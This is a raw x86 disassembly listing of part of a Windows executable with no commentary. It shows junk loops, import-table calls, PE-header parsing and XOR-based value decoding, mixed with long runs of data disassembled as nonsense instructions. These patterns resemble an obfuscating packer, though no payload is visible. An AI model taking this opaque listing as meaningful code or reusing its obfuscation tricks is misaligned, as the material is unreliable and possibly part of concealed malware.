  4061aa:	xchg   DWORD PTR [edi+ebx*4-0xfb60cbf],esi
  4061b1:	ja     0x40616b
  4061b3:	adc    esp,DWORD PTR [edx+0x7e00cf1b]
  4061b9:	lea    ecx,[ecx+0x230864b3]
  4061bf:	add    al,0x9e
  4061c1:	sti    
  4061c2:	js     0x40615b
  4061c4:	sbb    edx,DWORD PTR [esi]
  4061c6:	push   0xffffffb4
  4061c8:	adc    al,0xf1
  4061ca:	fmul   DWORD PTR [ebx-0x61fbc80c]
  4061d0:	adc    BYTE PTR [ecx+0x4e81a9ff],bh
  4061d6:	pop    edi
  4061d7:	aad    0x2d
  4061d9:	sub    edi,DWORD PTR [esi]
  4061db:	sahf   
  4061dc:	stos   DWORD PTR es:[edi],eax
  4061dd:	pusha  
  4061de:	fbld   TBYTE PTR [eax]
  4061e0:	cmp    DWORD PTR [eax+0x7c],ebx
  4061e3:	mov    ch,0xa5
  4061e5:	lods   al,BYTE PTR ds:[esi]
  4061e6:	push   esi
  4061e7:	xchg   ecx,eax
  4061e8:	mov    ah,0x24
  4061ea:	sbb    eax,0xbbd36232
  4061ef:	or     bl,bh
  4061f1:	loopne 0x40622e
  4061f3:	outs   dx,DWORD PTR ds:[esi]
  4061f4:	icebp  
  4061f5:	test   BYTE PTR [ebx+0x16eb3075],ch
  4061fb:	mov    ebp,0x41f83ef1
  406200:	neg    BYTE PTR [ecx]
  406202:	cmp    edx,DWORD PTR [esi-0x70]
  406205:	cmp    DWORD PTR [ebx-0x6a],ecx
  406208:	ins    BYTE PTR es:[edi],dx
  406209:	jmp    0xe7e1:0xd5834d25
  406210:	psraw  mm2,QWORD PTR [esi]
  406213:	push   0xd0006b3c
  406218:	out    0xf6,eax
  40621a:	pop    edi
  40621b:	xchg   ebp,eax
  40621c:	pop    eax
  40621d:	inc    ecx
  40621e:	int    0xe2
  406220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406221:	sti    
  406222:	rcl    BYTE PTR [ebp-0x6428f6fd],0xf7
  406229:	push   ds
  40622a:	fdiv   QWORD PTR cs:[ecx+0x11]
  40622e:	xor    edi,eax
  406230:	not    DWORD PTR [esi+0x2bd42332]
  406236:	dec    esi
  406237:	dec    edx
  406238:	into   
  406239:	sbb    al,0x3f
  40623b:	jns    0x40629e
  40623d:	(bad)  
  40623f:	lea    eax,[esi-0x7d34410]
  406245:	xchg   ecx,eax
  406246:	pop    esi
  406247:	cmp    eax,0x4b4bc10c
  40624c:	add    eax,0x8be20b42
  406251:	dec    edx
  406252:	dec    eax
  406253:	mov    ah,0x9b
  406255:	and    al,0x4c
  406257:	push   0x8895c516
  40625c:	pop    es
  40625d:	fcompp 
  40625f:	xchg   edx,eax
  406260:	retf   
  406261:	int    0x27
  406263:	int    0x33
  406265:	lock and DWORD PTR ds:0x4337a3,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x4337a3
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x4337a3,ecx
  406282:	cmp    DWORD PTR ds:0x4337a3,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x4337a3,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x4337a3,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x4337a3
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x4337a3,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	jbe    0x4062c0
  406313:	and    BYTE PTR [esp+edx*2+0x3f],cl
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40631e:	pushf  
  40631f:	adc    al,BYTE PTR [esi+eiz*2]
  406322:	jmp    0xa0e3:0x71be1eb9
  406329:	cli    
  40632a:	sbb    cl,bl
  40632c:	xchg   esi,eax
  40632d:	push   es
  40632e:	hlt    
  40632f:	push   eax
  406330:	or     ch,BYTE PTR [ebx]
  406332:	mov    bl,0x56
  406334:	cmp    DWORD PTR [ecx+edi*2-0xb],ecx
  406338:	fld    TBYTE PTR [esi]
  40633a:	mov    eax,edi
  40633c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40633d:	into   
  40633e:	dec    ebx
  40633f:	aam    0x3b
  406341:	les    eax,FWORD PTR [edi]
  406343:	push   cs
  406344:	sub    bh,BYTE PTR [ebp-0x79]
  406347:	mov    bh,0xdb
  406349:	and    eax,0xe9f79276
  40634e:	daa    
  40634f:	das    
  406350:	mov    WORD PTR [eax+0x10],ss
  406353:	xchg   ebx,eax
  406354:	cmp    al,0xe6
  406356:	xchg   edi,eax
  406357:	push   edi
  406358:	into   
  406359:	inc    edx
  40635a:	push   0x303d203a
  40635f:	cs test al,ah
  406362:	or     eax,0x94815008
  406367:	cmp    edi,edx
  406369:	mov    ch,0x1b
  40636b:	repnz ds repnz cld 
  40636f:	pop    ss
  406370:	in     al,dx
  406371:	cmp    ebx,esi
  406373:	push   ds
  406374:	jbe    0x4063ee
  406376:	xchg   edx,eax
  406377:	cmp    DWORD PTR [esi+0xe064acf],esp
  40637d:	dec    esp
  40637e:	sar    dh,cl
  406380:	iret   
  406381:	rol    DWORD PTR [ebp-0x15],cl
  406384:	stc    
  406385:	loope  0x40630b
  406387:	fst    DWORD PTR ds:0x4293e83c
  40638d:	cmc    
  40638e:	lds    ebp,FWORD PTR [ebp-0x28c89565]
  406394:	inc    ebx
  406395:	mov    ecx,0x50dfe3cc
  40639a:	jo     0x4063b4
  40639c:	jb     0x406330
  40639e:	jge    0x4063ce
  4063a0:	cmc    
  4063a1:	mov    ecx,0x2b3f5749
  4063a6:	enter  0x5b5e,0xb6
  4063aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063ab:	outs   dx,BYTE PTR ds:[esi]
  4063ac:	mov    cl,0xb6
  4063ae:	xchg   edx,eax
  4063af:	xchg   BYTE PTR [edx-0x54],bl
  4063b2:	xchg   BYTE PTR ds:0xb22d6c5c,cl
  4063b8:	popa   
  4063b9:	sbb    eax,0x288e0bd4
  4063be:	imul   ecx,DWORD PTR [ebx+0x52],0x946bbc20
  4063c5:	shl    ah,1
  4063c7:	pop    ebp
  4063c8:	jecxz  0x406388
  4063ca:	sbb    eax,0x8e2c3fb3
  4063cf:	and    eax,0x48fc1a49
  4063d4:	fist   DWORD PTR [ecx+0x11]
  4063d7:	clc    
  4063d8:	inc    edi
  4063d9:	cmp    eax,0x61eb9330
  4063de:	xchg   ebx,eax
  4063df:	stos   BYTE PTR es:[edi],al
  4063e0:	xlat   BYTE PTR ds:[ebx]
  4063e1:	shl    BYTE PTR [ebx],cl
  4063e3:	and    eax,0xd14bb101
  4063e8:	(bad)  
  4063e9:	popf   
  4063ea:	jg     0x4063cb
  4063ec:	retf   0xfff6
  4063ef:	mov    ds:0x27d05e9f,eax
  4063f4:	mov    DWORD PTR [ecx+0x46],0xbe2b52d3
  4063fb:	pop    ds
  4063fc:	dec    esi
  4063fd:	dec    ebp
  4063fe:	pusha  
  4063ff:	mov    cl,0xb5
  406401:	xchg   edi,eax
  406402:	cmp    ah,dh
  406404:	pop    ebp
  406405:	pop    edi
  406406:	or     eax,0xc60386ff
  40640b:	cld    
  40640c:	xor    DWORD PTR [edi+ecx*4-0x2e9be8fc],ecx
  406413:	call   0x86fd:0x4f201acb
  40641a:	adc    DWORD PTR es:[esi+0x5d],edx
  40641e:	in     eax,0xdb
  406420:	aad    0xb9
  406422:	and    DWORD PTR [esi],0x300bc72e
  406428:	fwait
  406429:	repnz sbb al,0x84
  40642c:	into   
  40642d:	std    
  40642e:	addr16 daa 
  406430:	xchg   BYTE PTR ss:[ebx],bl
  406433:	push   es
  406434:	cdq    
  406435:	sub    al,0x9
  406437:	xchg   dh,al
  406439:	pop    ss
  40643a:	fs imul esi,eax,0x6e4c6f5f
  406441:	jmp    DWORD PTR ds:0x80ad9f2c
  406447:	inc    eax
  406448:	nop
  406449:	out    0x21,al
  40644b:	or     BYTE PTR [ebp+0x35f7b93b],ch
  406451:	out    dx,eax
  406452:	inc    ebx
  406453:	cmp    eax,0x50c3f36e
  406458:	fcom   DWORD PTR [esi+0x63ac13e7]
  40645e:	fimul  DWORD PTR ds:0x4d3ef23d
  406464:	dec    edi
  406465:	mov    al,0x1
  406467:	adc    eax,DWORD PTR es:[ecx+0x4f15dbbd]
  40646e:	push   esp
  40646f:	call   0xbe5209cb
  406474:	mov    dh,0xd3
  406476:	int    0xba
  406478:	xor    eax,0x621d21b
  40647d:	or     cl,dl
  40647f:	inc    ebp
  406480:	or     dx,WORD PTR ss:[ebx-0x6db8144]
  406488:	mov    al,ds:0x2858bb73
  40648d:	adc    al,0x18
  40648f:	jno    0x4064b2
  406491:	jge    0x406502
  406493:	mov    ds:0xa158e878,eax
  406498:	xor    eax,0xe9a2d01f
  40649d:	lods   eax,DWORD PTR ds:[esi]
  40649e:	pop    ss
  40649f:	lds    edx,FWORD PTR [esi-0x5f5b8269]
  4064a5:	and    eax,0x34f73a7e
  4064aa:	fdivr  DWORD PTR [ebx+0x35]
  4064ad:	mov    DWORD PTR [esi],eax
  4064af:	lea    ebx,[edi-0x60]
  4064b2:	or     eax,0x35a39c17
  4064b7:	test   al,0x3b
  4064b9:	aad    0xc
  4064bb:	lock adc edx,esi
  4064be:	aas    
  4064bf:	pop    eax
  4064c0:	call   0x97757777
  4064c5:	fs mov esi,0xdc08a11d
  4064cb:	out    0x20,al
  4064cd:	fadd   QWORD PTR [eax-0x63803ad]
  4064d3:	cmp    esi,esi
  4064d5:	stos   BYTE PTR es:[edi],al
  4064d6:	xchg   ecx,eax
  4064d7:	ss out 0x37,eax
  4064da:	(bad)  
  4064db:	jp     0x40649e
  4064dd:	mov    WORD PTR [si],gs
  4064e0:	add    al,0x65
  4064e2:	inc    esp
  4064e3:	push   edi
  4064e4:	adc    DWORD PTR [eax+0x1a42a322],0x1a
  4064eb:	jp     0x40655d
  4064ed:	push   esp
  4064ee:	bound  ebx,QWORD PTR [eax+eiz*4-0x6d]
  4064f2:	int    0xb0
  4064f4:	xchg   edi,eax
  4064f5:	mov    ch,0x68
  4064f7:	or     ah,BYTE PTR [edx-0x6a8c9f25]
  4064fd:	and    eax,0xb8b8597d
  406502:	mov    bh,0x53
  406504:	imul   ecx,DWORD PTR [eax],0x514106b1
  40650a:	inc    edi
  40650b:	push   es
  40650c:	push   esi
  40650d:	jns    0x406492
  40650f:	(bad)  
  406510:	enter  0x6150,0x47
  406514:	jle    0x406514
  406516:	pop    ecx
  406517:	sbb    dh,BYTE PTR [eax]
  406519:	(bad)  
  40651a:	pop    eax
  40651b:	std    
  40651c:	sub    eax,esp
  40651e:	out    0x7f,al
  406520:	stc    
  406521:	jmp    0x478c72a
  406526:	push   ebx
  406528:	sar    BYTE PTR [edi-0xc28431b],0xa
  40652f:	in     al,dx
  406530:	loope  0x4064cc
  406532:	out    0x75,eax
  406534:	cld    
  406535:	scas   eax,DWORD PTR es:[edi]
  406536:	mov    dl,0x14
  406538:	sub    al,ah
  40653a:	shl    BYTE PTR ds:0x9c4fd77f,cl
  406540:	bound  edx,QWORD PTR [edi-0x40d23c5]
  406546:	sbb    al,0xe3
  406548:	rcr    DWORD PTR [eax-0x565073a5],0xd8
  40654f:	push   dx
  406551:	mov    ebx,0xc2f6f442
  406556:	mov    bh,0x7
  406558:	stos   BYTE PTR es:[edi],al
  406559:	leave  
  40655a:	cdq    
  40655b:	jp     0x4065d5
  40655d:	mov    WORD PTR [ecx-0x30bc85c2],ss
  406563:	sub    BYTE PTR [ecx-0x51],dl
  406566:	or     al,0xf4
  406568:	push   edx
  406569:	jp     0x40655e
  40656b:	adc    DWORD PTR [eax-0x60],ecx
  40656e:	and    BYTE PTR [edi+eax*8],cl
  406571:	xchg   BYTE PTR [eax-0x7a],dl
  406574:	fild   DWORD PTR [esi]
  406576:	std    
  406577:	mov    cl,0x8c
  406579:	and    al,bh
  40657b:	fld    TBYTE PTR [edx-0x80]
  40657e:	dec    ebp
  40657f:	xchg   ebx,eax
  406580:	xchg   ebp,eax
  406581:	imul   eax,DWORD PTR [ebx],0x8dd80bb
  406587:	loop   0x4065ff
  406589:	pop    ebx
  40658a:	fistp  WORD PTR [ecx+0x0]
  40658d:	jecxz  0x40660c
  40658f:	push   edi
  406590:	jge    0x406541
  406592:	pusha  
  406593:	pop    ebp
  406594:	adc    al,0x5e
  406596:	jmp    0x4065b8
  406598:	jae    0x4065fb
  40659a:	push   ebp
  40659b:	cmp    esi,eax
  40659d:	leave  
  40659e:	dec    ebp
  40659f:	xlat   BYTE PTR ds:[ebx]
  4065a0:	push   ss
  4065a1:	(bad)  
  4065a2:	scas   al,BYTE PTR es:[edi]
  4065a3:	jb     0x406538
  4065a5:	mov    ds,WORD PTR [eax-0x5e]
  4065a8:	jmp    0xc97763a
  4065ad:	(bad)  
  4065ae:	push   ds
  4065af:	cld    
  4065b0:	push   cs
  4065b1:	fcmovbe st,st(4)
  4065b3:	dec    ebp
  4065b4:	pop    es
  4065b5:	cld    
  4065b6:	cmp    eax,0x14cb5b94
  4065bb:	pop    esp
  4065bc:	out    0x1,al
  4065be:	jns    0x4065fa
  4065c0:	cmp    eax,0x92420826
  4065c5:	push   cs
  4065c6:	mov    dl,0xa9
  4065c8:	lods   eax,DWORD PTR ds:[esi]
  4065c9:	sub    eax,0x5b9a0bdd
  4065ce:	imul   edx,DWORD PTR [ecx+0x2d3b937c],0xffffffc9
  4065d5:	jnp    0x406630
  4065d7:	pop    esp
  4065d8:	dec    edi
  4065d9:	and    bh,al
  4065db:	mov    cl,BYTE PTR [edi+0x6e]
  4065de:	lods   eax,DWORD PTR ds:[esi]
  4065df:	jg     0x4065b6
  4065e1:	sbb    esp,esi
  4065e3:	out    dx,eax
  4065e4:	ficom  DWORD PTR [ecx-0x5f]
  4065e7:	cmp    edx,ebp
  4065e9:	(bad)  
  4065ea:	fcomp  QWORD PTR [edx+0x63]
  4065ed:	rol    DWORD PTR [edi],0x3f
  4065f0:	(bad)  
  4065f2:	cwde   
  4065f3:	shl    DWORD PTR [edi+0x40],0xff
  4065f7:	test   BYTE PTR ds:0xd1dea7f7,cl
  4065fd:	adc    al,0xbf
  4065ff:	or     ebx,0xffffffb6
  406602:	mov    esp,0xcfd52e8e
  406607:	ss push sp
  40660a:	pop    ecx
  40660b:	lods   eax,DWORD PTR ds:[esi]
  40660c:	sub    eax,DWORD PTR [ebx+0x1848d509]
  406612:	pushf  
  406613:	inc    esp
  406614:	out    dx,al
  406615:	and    al,0x8b
  406617:	mov    dl,0x86
  406619:	in     al,dx
  40661a:	dec    ebx
  40661b:	stc    
  40661c:	ja     0x40665a
  40661e:	xor    DWORD PTR [esi+0x56],esp
  406621:	lahf   
  406622:	xadd   edx,ebp
  406625:	test   bl,0xd8
  406628:	std    
  406629:	mov    ebp,DWORD PTR [edx-0x58d3b]
  40662f:	int    0x10
  406631:	nop
  406632:	sub    cl,al
  406634:	jg     0x4065e3
  406636:	sbb    eax,eax
  406638:	icebp  
  406639:	or     al,0x74
  40663b:	jnp    0x40662f
  40663d:	fsubr  DWORD PTR [ebx+eax*2]
  406640:	xor    bl,BYTE PTR [edx-0x23]
  406643:	test   al,0x3b
  406645:	dec    BYTE PTR [ebx]
  406647:	and    BYTE PTR [ecx+ebx*1-0x7a],0xdb
  40664c:	push   0xd0ff5284
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x43367b,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x433753,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x433727,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x433763,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x433763
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x433763,ecx
  4066d8:	cmp    DWORD PTR ds:0x433763,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433883
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x433763,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x433763
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x433763,ecx
  406714:	cmp    DWORD PTR ds:0x433763,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x433757
  406728:	and    ecx,DWORD PTR ds:0x43368f
  40672e:	mov    DWORD PTR ds:0x433757,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43369b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x4337ab
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433693,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x4336eb,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433687,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433687
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433687,ebx
  40677d:	cmp    DWORD PTR ds:0x433687,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433687,0x23
  406791:	jne    0x4067a7
  406797:	push   0x4338b3
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x43372b,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433717,0x433727
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x433753
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x4336eb,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433693,0x43371f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433687,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x43372f
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x433763
  40683c:	and    DWORD PTR ds:0x433727,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x4337ab
  40684d:	or     DWORD PTR ds:0x433763,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x4336db,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43379f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x43372b
  406870:	sub    DWORD PTR ds:0x433753,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43368b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433687,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433693,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43368f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x4336a3,0x4337ab
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43371b,0x43375f
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x433767,0x433713
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x4336d3,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x4336db,0x43376f
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x43372b,0x4336ef
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x4336db,0x43371b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x43367b
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x43367b,0x4336a3
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x43375b
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x43367f,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x43376f,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43379b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43379b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43379b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43379b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43379b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433717
  4069db:	adc    ecx,DWORD PTR ds:0x4336df
  4069e1:	mov    DWORD PTR ds:0x433717,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433713,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x4336e7,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433713,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43368f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43371b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43369b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x433753,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xbc02385f
  406b85:	fiadd  WORD PTR [edx]
